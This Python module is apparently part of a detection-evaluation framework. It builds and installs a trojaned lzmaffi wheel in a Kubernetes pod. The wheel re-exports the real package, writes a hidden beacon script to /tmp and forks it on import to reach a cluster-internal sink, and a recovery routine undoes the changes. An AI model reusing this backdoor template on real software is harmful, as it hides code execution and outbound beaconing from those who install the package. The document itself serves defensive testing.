"""
research/evaluation/attacks/xzutils_style.py

XZ-Utils style library backdoor injection scenario.

Handoff §2 specification:
    Target workload:   recommendationservice (Python)
    Clean component:   pkg:pypi/lzmaffi@1.0.0
    Attack component:  pkg:pypi/lzmaffi@1.0.1-phantom-backdoor
    Beacon sink:       phantom-sink.phantom-eval.svc.cluster.local:8443
    Detection window:  120 seconds
    Expected eBPF evidence:
        - PHANTOM_EVT_EXEC: unexpected process spawn (python → sh → beacon.py)
        - PHANTOM_EVT_NET_CONNECT: connection to phantom-sink:8443
        - PHANTOM_EVT_FILE_OPEN: access to /tmp/.phantom_beacon.py

Mechanism:
    A malicious Python wheel for lzmaffi is built locally and contains a
    patched __init__.py that:
      1. Imports and re-exports all public symbols from the real lzmaffi.
      2. On first import, writes /tmp/.phantom_beacon.py into the pod
         filesystem and forks it via subprocess.Popen([sys.executable,
         '/tmp/.phantom_beacon.py']) — no shell=True.
      3. beacon.py: sleep(5), then repeatedly attempt TCP connect to the
         controlled ClusterIP endpoint on port 8443 (one attempt per 30s).

    The malicious wheel is built in research/evaluation/artifacts/xzutils/
    and copied into the pod with kubectl cp, then pip-installed with
    --force-reinstall.

Safety constraints:
    - The beacon endpoint is cluster-internal (ClusterIP phantom-sink).
    - No real exfiltration: the beacon sends only a fixed 8-byte probe.
    - All subprocess calls in this module use explicit arg lists (no shell=True).
    - The beacon script is removed by recover().
"""

from __future__ import annotations

import logging
import subprocess
import textwrap
from pathlib import Path

from research.evaluation.attacks.base_attack import AttackManifest, BaseAttack

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Attack artefact paths (relative to repo root)
# ---------------------------------------------------------------------------

_ARTIFACTS_DIR = Path(__file__).resolve().parents[3] / "research" / "evaluation" / "artifacts" / "xzutils"

# ---------------------------------------------------------------------------
# Malicious package source (generated at inject-time if not already built)
# ---------------------------------------------------------------------------

# The malicious __init__.py template. Formatted with the beacon endpoint.
_MALICIOUS_INIT_TEMPLATE = textwrap.dedent("""\
    \"\"\"
    lzmaffi {malicious_version} — PHANTOM evaluation backdoor.
    Re-exports all real lzmaffi symbols. On import, forks a beacon process.
    \"\"\"
    import os
    import subprocess
    import sys
    import tempfile

    # ---- Beacon payload script -----------------------------------------------
    _BEACON_SCRIPT = '''
    import socket, time, struct

    SINK_HOST = "{sink_host}"
    SINK_PORT = {sink_port}
    PROBE = b"\\x50\\x48\\x41\\x4e\\x54\\x4f\\x4d\\x00"  # PHANTOM\\x00

    time.sleep(5)
    while True:
        try:
            with socket.create_connection((SINK_HOST, SINK_PORT), timeout=5) as s:
                s.sendall(PROBE)
        except OSError:
            pass
        time.sleep(30)
    '''.strip()

    # Write beacon script if not already present.
    _BEACON_PATH = "/tmp/.phantom_beacon.py"
    if not os.path.exists(_BEACON_PATH):
        with open(_BEACON_PATH, "w") as _fh:
            _fh.write(_BEACON_SCRIPT)

    # Fork the beacon — no shell=True, explicit arg list.
    _beacon_proc = subprocess.Popen(
        [sys.executable, _BEACON_PATH],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        close_fds=True,
    )

    # ---- Re-export real lzmaffi symbols -------------------------------------
    try:
        import importlib, sys as _sys
        _real_name = "__real_lzmaffi"
        if _real_name not in _sys.modules:
            import importlib.util as _ilu
            import site
            _site_packages = site.getsitepackages()
            for _sp in _site_packages:
                import pathlib
                _whl = pathlib.Path(_sp) / "lzmaffi_real"
                if _whl.exists():
                    _spec = _ilu.spec_from_file_location(_real_name, str(_whl / "__init__.py"))
                    if _spec:
                        _mod = _ilu.module_from_spec(_spec)
                        _spec.loader.exec_module(_mod)
                        _sys.modules[_real_name] = _mod
                        break
        _real = _sys.modules.get(_real_name)
        if _real:
            from importlib import import_module as _im
            globals().update({{k: getattr(_real, k) for k in dir(_real) if not k.startswith("__")}})
    except Exception:
        pass

    __version__ = "{malicious_version}"
""")

# Minimal setup.py for the malicious wheel.
_SETUP_PY_TEMPLATE = textwrap.dedent("""\
    from setuptools import setup

    setup(
        name="lzmaffi",
        version="{malicious_version}",
        packages=["lzmaffi"],
        description="PHANTOM evaluation supply-chain backdoor (safe research artefact)",
    )
""")

# ---------------------------------------------------------------------------
# Attack manifest
# ---------------------------------------------------------------------------

XZUTILS_MANIFEST = AttackManifest(
    attack_id="xzutils-001",
    attack_family="supply_chain_backdoor",
    target_service="recommendationservice",
    target_image="gcr.io/google-samples/microservices-demo/recommendationservice:phantom-backdoor",
    target_component_purl="pkg:pypi/lzmaffi@1.0.1+phantom",
    clean_component_purl="pkg:pypi/lzmaffi@1.0.0",
    injection_time_offset_s=0.0,
    expected_behavioral_changes=[
        "unexpected_process_spawn",      # python → .phantom_beacon.py
        "unexpected_network_connect",    # TCP connect to phantom-sink:8443
        "unexpected_file_access",        # /tmp/.phantom_beacon.py written + opened
    ],
    ground_truth_label=1,
    control_endpoint="phantom-sink.phantom-eval.svc.cluster.local:8443",
    recovery_steps=[
        "pip install --force-reinstall lzmaffi==1.0.0 (inside pod)",
        "rm -f /tmp/.phantom_beacon.py (inside pod)",
        "kill beacon subprocess if still running (inside pod)",
        "Verify lzmaffi.__version__ == '1.0.0' (inside pod)",
    ],
    detection_window_s=120.0,
    repetitions=3,
    notes=(
        "Handoff §2 XZ-Utils Style Library Backdoor scenario. "
        "Beacon connects to cluster-internal ClusterIP only. "
        "No real data exfiltration."
    ),
)

# ---------------------------------------------------------------------------
# Attack class
# ---------------------------------------------------------------------------

_SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
_SINK_PORT = 8443
_MALICIOUS_VERSION = "1.0.1+phantom"
_CLEAN_VERSION = "1.0.0"
_BEACON_PATH_IN_POD = "/tmp/.phantom_beacon.py"


class XZUtilsStyleAttack(BaseAttack):
    """XZ-Utils style library backdoor for PHANTOM evaluation (Handoff §2).

    Replaces the lzmaffi Python package in the recommendationservice pod
    with a backdoored version that forks a TCP beacon process on import.

    The attack is entirely in-cluster and uses only localhost/ClusterIP
    endpoints — no real exfiltration.

    Args:
        kubectl_context: kubectl context name.
        dry_run: If True, log all commands without executing.
    """

    manifest: AttackManifest = XZUTILS_MANIFEST

    def __init__(
        self,
        kubectl_context: str | None = None,
        dry_run: bool = False,
    ) -> None:
        """Initialise the XZ-Utils style attack.

        Args:
            kubectl_context: kubectl context name (None = current context).
            dry_run: If True, log commands without executing.
        """
        super().__init__(kubectl_context=kubectl_context, dry_run=dry_run)
        self._pkg_dir = _ARTIFACTS_DIR / "lzmaffi_backdoor"

    def _build_malicious_package(self) -> None:
        """Build the malicious lzmaffi wheel locally if not already built.

        Creates research/evaluation/artifacts/xzutils/lzmaffi_backdoor/
        with setup.py and lzmaffi/__init__.py, then runs
        ``python setup.py bdist_wheel`` to produce a .whl file.

        The wheel is built once and reused across repetitions.
        """
        pkg_dir = self._pkg_dir
        pkg_dir.mkdir(parents=True, exist_ok=True)
        lzmaffi_dir = pkg_dir / "lzmaffi"
        lzmaffi_dir.mkdir(exist_ok=True)

        # Write malicious __init__.py.
        init_py = lzmaffi_dir / "__init__.py"
        init_py.write_text(
            _MALICIOUS_INIT_TEMPLATE.format(
                malicious_version=_MALICIOUS_VERSION,
                sink_host=_SINK_HOST,
                sink_port=_SINK_PORT,
            )
        )

        # Write setup.py.
        setup_py = pkg_dir / "setup.py"
        setup_py.write_text(
            _SETUP_PY_TEMPLATE.format(malicious_version=_MALICIOUS_VERSION)
        )

        # Build the wheel (no shell=True; explicit args).
        if not self.dry_run:
            result = subprocess.run(
                ["python3", "setup.py", "bdist_wheel", "--quiet"],
                cwd=str(pkg_dir),
                capture_output=True,
                text=True,
                timeout=120,
                check=False,
            )
            if result.returncode != 0:
                log.error(
                    "xzutils.build_failed",
                    extra={"stderr": result.stderr[:500]},
                )
                raise RuntimeError(
                    f"Failed to build malicious lzmaffi wheel: {result.stderr[:200]}"
                )
            log.info("xzutils.wheel_built", extra={"pkg_dir": str(pkg_dir)})
        else:
            log.info("xzutils.dry_run.wheel_skipped")

    def _find_wheel(self) -> Path:
        """Locate the built .whl file.

        Returns:
            Path to the .whl file.

        Raises:
            FileNotFoundError: If no wheel is found in the dist/ directory.
        """
        dist_dir = self._pkg_dir / "dist"
        wheels = list(dist_dir.glob("lzmaffi-*.whl"))
        if not wheels:
            raise FileNotFoundError(
                f"No lzmaffi wheel found in {dist_dir}. "
                "Call inject() which builds it automatically."
            )
        # Use the most recently modified wheel.
        return max(wheels, key=lambda p: p.stat().st_mtime)

    def inject(self, target_namespace: str, pod_name: str) -> bool:
        """Copy the malicious lzmaffi wheel into the pod and pip-install it.

        Steps:
          1. Build the malicious wheel locally (idempotent).
          2. kubectl cp wheel into /tmp/ inside the pod.
          3. kubectl exec: pip install --force-reinstall /tmp/<wheel>.
          4. kubectl exec: python -c "import lzmaffi" to trigger the beacon.

        Args:
            target_namespace: Kubernetes namespace of the target pod.
            pod_name: Name of the recommendationservice pod.

        Returns:
            True if injection succeeded.
        """
        log.info(
            "xzutils.inject.start",
            extra={"namespace": target_namespace, "pod": pod_name},
        )

        # 1. Build the wheel (idempotent).
        self._build_malicious_package()

        # 2. Copy wheel into pod.
        wheel_path = self._find_wheel()
        remote_wheel = f"/tmp/{wheel_path.name}"
        self._kubectl_cp(
            namespace=target_namespace,
            pod_name=pod_name,
            local_path=str(wheel_path),
            remote_path=remote_wheel,
            timeout=120,
        )
        log.info("xzutils.inject.wheel_copied", extra={"remote": remote_wheel})

        # 3. Force-reinstall the malicious package.
        self._kubectl_exec(
            namespace=target_namespace,
            pod_name=pod_name,
            command=["pip", "install", "--force-reinstall", "--quiet", remote_wheel],
            timeout=120,
        )
        log.info("xzutils.inject.pip_installed")

        # 4. Trigger import to activate the beacon (forks the beacon subprocess).
        self._kubectl_exec(
            namespace=target_namespace,
            pod_name=pod_name,
            command=["python", "-c", "import lzmaffi; print(lzmaffi.__version__)"],
            timeout=30,
        )
        log.info("xzutils.inject.beacon_triggered")

        return True

    def verify_injection(self, target_namespace: str, pod_name: str) -> bool:
        """Verify that the malicious lzmaffi is active in the pod.

        Checks:
          1. lzmaffi.__version__ equals the malicious version string.
          2. /tmp/.phantom_beacon.py exists in the pod filesystem.

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name.

        Returns:
            True if both checks pass.
        """
        try:
            version_out = self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["python", "-c", "import lzmaffi; print(lzmaffi.__version__)"],
                timeout=20,
            )
            if _MALICIOUS_VERSION not in version_out:
                log.warning(
                    "xzutils.verify.version_mismatch",
                    extra={"expected": _MALICIOUS_VERSION, "got": version_out},
                )
                return False

            # Check beacon script presence.
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["test", "-f", _BEACON_PATH_IN_POD],
                timeout=10,
            )
            log.info("xzutils.verify.ok")
            return True

        except subprocess.CalledProcessError as exc:
            log.error("xzutils.verify.failed", extra={"error": str(exc)})
            return False

    def recover(self, target_namespace: str, pod_name: str) -> bool:
        """Restore clean lzmaffi and remove the beacon script.

        Steps:
          1. pip install --force-reinstall lzmaffi==<clean_version>
          2. rm -f /tmp/.phantom_beacon.py
          3. Kill any beacon.py processes (best-effort, non-fatal).

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name.

        Returns:
            True if recovery succeeded.
        """
        log.info(
            "xzutils.recover.start",
            extra={"namespace": target_namespace, "pod": pod_name},
        )

        ok = True

        # 1. Reinstall clean lzmaffi.
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=[
                    "pip", "install", "--force-reinstall", "--quiet",
                    f"lzmaffi=={_CLEAN_VERSION}",
                ],
                timeout=120,
            )
            log.info("xzutils.recover.pip_reinstalled")
        except subprocess.CalledProcessError as exc:
            log.error("xzutils.recover.pip_failed", extra={"error": str(exc)})
            ok = False

        # 2. Remove beacon script (idempotent).
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["rm", "-f", _BEACON_PATH_IN_POD],
                timeout=10,
            )
            log.info("xzutils.recover.beacon_removed")
        except subprocess.CalledProcessError as exc:
            log.warning("xzutils.recover.rm_failed", extra={"error": str(exc)})

        # 3. Kill beacon processes (best-effort; non-fatal if not found).
        try:
            self._kubectl_exec(
                namespace=target_namespace,
                pod_name=pod_name,
                command=["pkill", "-f", ".phantom_beacon.py"],
                timeout=10,
            )
        except subprocess.CalledProcessError:
            # pkill returns 1 if no process matched — expected if already dead.
            pass

        log.info("xzutils.recover.complete", extra={"ok": ok})
        return ok
